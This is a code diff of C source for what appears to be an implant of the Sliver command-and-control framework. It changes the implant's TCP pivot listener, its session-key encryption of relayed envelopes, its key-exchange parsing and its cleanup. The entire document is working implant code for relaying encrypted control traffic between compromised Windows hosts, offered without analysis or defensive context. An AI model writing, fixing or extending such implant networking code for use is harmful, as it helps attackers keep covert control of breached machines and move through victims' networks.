@@ -111,9 +111,8 @@ PSLIVER_TCP_CLIENT TcpInit()
 	pResult->dwPort = dwPort;
 
 	SecureZeroMemory(&WsaData, sizeof(WsaData));
-	ErrorCode = WSAStartup(MAKEWORD(2, 2), &WsaData);
-	if (ErrorCode != 0) {
-		LOG_ERROR("WSAStartup", ErrorCode);
+	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
+		LOG_ERROR("WSAStartup", WSAGetLastError());
 		goto CLEANUP;
 	}
 
@@ -248,7 +247,7 @@ BOOL TcpStart
 	pEnvelope->pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
 	pPivotServerKeyExchangeEnvelope = MarshalEnvelope(pEnvelope);
 
-	pCipherText = SliverEncrypt(pConfig, pPivotServerKeyExchangeEnvelope, FALSE);
+	pCipherText = SliverEncrypt(pConfig->pPeerSessionKey, pPivotServerKeyExchangeEnvelope);
 	if (!SocketSend(pSliverTcpClient, pCipherText)) {
 		goto CLEANUP;
 	}
@@ -263,8 +262,8 @@ BOOL TcpStart
 	ServerKeyExResp[0]->Type = Varint;
 
 	ServerKeyExResp[1] = ALLOC(sizeof(PBElement));
-	ServerKeyExResp[1]->dwFieldIdx = 1;
-	ServerKeyExResp[1]->Type = Varint;
+	ServerKeyExResp[1]->dwFieldIdx = 2;
+	ServerKeyExResp[1]->Type = Bytes;
 
 	UnmarshaledData = UnmarshalStruct(ServerKeyExResp, _countof(ServerKeyExResp), pRecvEnvelope->pData->pBuffer, pRecvEnvelope->pData->cbBuffer, NULL);
 	if (UnmarshaledData == NULL || UnmarshaledData[1] == NULL) {
@@ -289,6 +288,12 @@ CLEANUP:
 	for (i = 0; i < _countof(ServerKeyExResp); i++) {
 		FREE(ServerKeyExResp[i]);
 	}
+
+	if (UnmarshaledData != NULL) {
+		FreeBuffer((PBUFFER)UnmarshaledData[1]);
+		FREE(UnmarshaledData);
+	}
+	
 
 	return Result;
 }
@@ -374,7 +379,7 @@ BOOL TcpSend
 		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
 		pPivotPeerEnvelope->uType = MsgPivotSessionEnvelope;
 		pPivotPeerEnvelope->pPivotSessionID = BufferInit(pConfig->PivotSessionID, sizeof(pConfig->PivotSessionID));
-		pPivotPeerEnvelope->pData = SliverEncrypt(pConfig, pPlainText, TRUE);
+		pPivotPeerEnvelope->pData = SliverEncrypt(pConfig->pSessionKey, pPlainText);
 		pPivotPeerEnvelope->cPivotPeers = 1;
 		pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
 		pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
@@ -394,7 +399,7 @@ BOOL TcpSend
 		pPlainText = NULL;
 	}
 
-	pPeerCiphertext = SliverEncrypt(pConfig, pPeerPlainText, FALSE);
+	pPeerCiphertext = SliverEncrypt(pConfig->pPeerSessionKey, pPeerPlainText);
 	if (!SocketSend(pTcpClient, pPeerCiphertext)) {
 		goto CLEANUP;
 	}
@@ -425,13 +430,6 @@ PPIVOT_CONNECTION TcpAccept
 		goto CLEANUP;
 	}
 
-	if (pListener->Connections == NULL) {
-		pListener->Connections = ALLOC(sizeof(PPIVOT_CONNECTION));
-	}
-	else {
-		pListener->Connections = REALLOC(pListener->Connections, sizeof(PPIVOT_CONNECTION) * (pListener->dwNumberOfConnections + 1));
-	}
-
 	pResult = ALLOC(sizeof(PIVOT_CONNECTION));
 	/*pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
 	pResult->lpHost = DuplicateStrA(szHost, 0);
@@ -456,7 +454,7 @@ PPIVOT_LISTENER CreateTCPPivotListener
 	_In_ LPSTR lpBindAddress
 )
 {
-	PPIVOT_LISTENER pResult = NULL;
+	PPIVOT_LISTENER pListener = NULL;
 	IN_ADDR InAddr;
 	IN6_ADDR In6Addr;
 	BOOL UseIpv4 = TRUE;
@@ -465,10 +463,16 @@ PPIVOT_LISTENER CreateTCPPivotListener
 	SOCKADDR_IN6_LH SockAddr6;
 	ULONG uScopeId = 0;
 	USHORT uPort = 0;
-	SOCKET Sock;
+	SOCKET Sock = INVALID_SOCKET;
 	ULONG IoBlock = 1;
 	DWORD dwErrorCode = 0;
-	HANDLE hThread = NULL;
+	BOOL IsOk = FALSE;
+	WSADATA WsaData;
+
+	SecureZeroMemory(&WsaData, sizeof(WsaData));
+	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
+		goto CLEANUP;
+	}
 
 	SecureZeroMemory(&InAddr, sizeof(InAddr));
 	SecureZeroMemory(&In6Addr, sizeof(In6Addr));
@@ -524,30 +528,30 @@ PPIVOT_LISTENER CreateTCPPivotListener
 		goto CLEANUP;
 	}
 
-	pResult = ALLOC(sizeof(PIVOT_LISTENER));
-	pResult->ListenHandle = Sock;
-	pResult->lpBindAddress = DuplicateStrA(lpBindAddress, 0);
-	pResult->dwType = PivotType_TCP;
-	pResult->dwListenerId = pConfig->dwListenerID++;
-	pResult->pConfig = pConfig;
-	pResult->lpUpstream = lpClient;
+	IsOk = TRUE;
+	pListener = ALLOC(sizeof(PIVOT_LISTENER));
+	pListener->ListenHandle = Sock;
+	pListener->lpBindAddress = DuplicateStrA(lpBindAddress, 0);
+	pListener->dwType = PivotType_TCP;
+	pListener->dwListenerId = pConfig->dwListenerID++;
+	pListener->pConfig = pConfig;
+	pListener->lpUpstream = lpClient;
 
-	pResult->RawSend = SocketSend;
-	pResult->RawRecv = SocketRecv;
-	pResult->SendEnvelope = TcpSend;
-	pResult->RecvEnvelope = TcpRecv;
-	pResult->Accept = TcpAccept;
-	pResult->Close = TcpClose;
-	pResult->Cleanup = TcpCleanup;
-	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pResult, 0, NULL) == NULL) {
+	pListener->RawSend = SocketSend;
+	pListener->RawRecv = SocketRecv;
+	pListener->Accept = TcpAccept;
+	pListener->Close = TcpClose;
+	pListener->Cleanup = TcpCleanup;
+	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pListener, 0, NULL) == NULL) {
 		LOG_ERROR("CreateThread", GetLastError());
 		goto CLEANUP;
 	}
 
 CLEANUP:
-	if (!pResult && Sock != 0) {
+	if (!IsOk && Sock != 0) {
 		closesocket(Sock);
+		WSACleanup();
 	}
 
-	return pResult;
+	return pListener;
 }
